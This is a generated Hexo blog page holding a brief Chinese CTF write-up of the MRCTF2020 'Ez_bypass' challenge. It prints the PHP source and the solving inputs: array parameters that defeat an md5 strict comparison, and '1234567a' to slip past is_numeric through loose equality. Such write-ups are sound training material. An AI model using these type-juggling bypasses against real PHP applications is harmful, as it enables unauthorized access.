@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>20230621 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="[MRCTF2020]Ez_bypass 进去发现一堆代码 1I put something in F12 for you include &amp;#x27;flag.php&amp;#x27;; $flag&#x3D;&amp;#x27;MRCTF&amp;#123;xxxxxxxxxxxxxxxxxxxxxxxxx&amp;#125;&amp;#x27;; if(isset($_GET[&amp;#x27;gg&amp;#x27;])&amp;&amp;isset">
+<meta property="og:type" content="article">
+<meta property="og:title" content="20230621">
+<meta property="og:url" content="http://example.com/2023/06/21/20230621/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="[MRCTF2020]Ez_bypass 进去发现一堆代码 1I put something in F12 for you include &amp;#x27;flag.php&amp;#x27;; $flag&#x3D;&amp;#x27;MRCTF&amp;#123;xxxxxxxxxxxxxxxxxxxxxxxxx&amp;#125;&amp;#x27;; if(isset($_GET[&amp;#x27;gg&amp;#x27;])&amp;&amp;isset">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-06-21T14:24:11.000Z">
+<meta property="article:modified_time" content="2023-06-21T15:13:21.903Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-20230621" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/06/21/20230621/" class="article-date">
+  <time class="dt-published" datetime="2023-06-21T14:24:11.000Z" itemprop="datePublished">2023-06-21</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/unctf/">unctf</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      20230621
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><ol>
+<li><p>进去发现一堆代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 for you include &#x27;flag.php&#x27;; $flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;; if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125; &#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125; &#125; else&#123; die(&#x27;Please input first&#x27;); &#125; &#125;Please input first</span><br></pre></td></tr></table></figure>
+
+<p>大致意思如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123; </span><br><span class="line">	<span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]; <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>]; </span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>; </span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123; </span><br><span class="line">				<span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]; </span><br><span class="line">					<span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>)) &#123; </span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>) &#123; </span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>; </span><br><span class="line">						<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line">						<span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>); &#125; </span><br><span class="line">					<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>; &#125; </span><br><span class="line">				&#125; <span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>; &#125; </span><br><span class="line">			&#125; <span class="keyword">else</span>&#123; <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>); &#125; </span><br><span class="line">		&#125; <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>; &#125; </span><br><span class="line">	&#125; <span class="keyword">else</span>&#123; <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>); &#125; </span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>三个参数, md5强等于数组绕过, is_numeric绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//GET</span><br><span class="line">?gg[]=1&amp;id[]=2</span><br><span class="line"></span><br><span class="line">//POST</span><br><span class="line">passwd=1234567a</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/06/21/20230621/" data-id="clj5uu3kc0000youz2mvdddpr" data-title="20230621" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/06/20/20230620/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">20230620</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFshow/">CTFshow</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/SCTF/">SCTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/SYCTF2023/">SYCTF2023</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/buuctf/">buuctf</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ciscn/">ciscn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/shaanxi/">shaanxi</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/unctf/">unctf</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/21/20230621/">20230621</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/20/20230620/">20230620</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/19/20230619/">20230619</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/17/20230616/">20230616</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/14/20230614/">20230614</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
